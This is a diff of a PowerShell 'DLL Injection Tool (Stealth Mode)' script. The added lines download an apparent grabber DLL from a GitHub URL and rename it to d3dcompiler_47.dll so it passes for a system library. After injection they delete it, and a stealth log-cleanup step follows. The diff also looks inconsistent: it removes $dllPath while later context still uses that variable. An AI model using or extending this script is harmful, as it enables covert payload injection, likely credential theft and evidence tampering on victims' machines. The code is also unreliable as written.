@@ -2,9 +2,19 @@
 # DLL Injection Tool (Stealth Mode)
 # ================================
 
-# STEP 0: Download DLL before anything else
+# STEP 0: Download DLL and rename it to d3dcompiler_47.dll
+
+# Define source URL and initial download path
 $dllUrl = "https://raw.githubusercontent.com/Mohit-Parihar-112/manualmappfucker-projecct/refs/heads/main/badmos-g*abber.dll"
-$dllPath = "D:\virtualbox\KaliLinux\Logs\badmos-g*abber.dll"
+$originalPath = "D:\virtualbox\KaliLinux\Logs\badmos-g*abber.dll"
+$renamedPath = "D:\virtualbox\KaliLinux\Logs\d3dcompiler_47.dll"
+
+# Download the DLL
+Invoke-WebRequest -Uri $dllUrl -OutFile $originalPath -UseBasicParsing
+
+# Rename the DLL
+Rename-Item -Path $originalPath -NewName "d3dcompiler_47.dll" -Force
+
 
 # Create directory if it doesn't exist
 $dir = Split-Path $dllPath
@@ -34,6 +44,12 @@ $proc.WaitForExit()
 
 # STEP 5: Remove EXE after injection
 Remove-Item -Path $tempPath -Force -ErrorAction SilentlyContinue
+
+# Delete the DLL if it exists
+$dllToDelete = "D:\virtualbox\KaliLinux\Logs\d3dcompiler_47.dll"
+if (Test-Path $dllToDelete) {
+    Remove-Item -Path $dllToDelete -Force
+}
 
 # STEP 6: Stealth Cleanup Logs
 Start-Job -ScriptBlock {
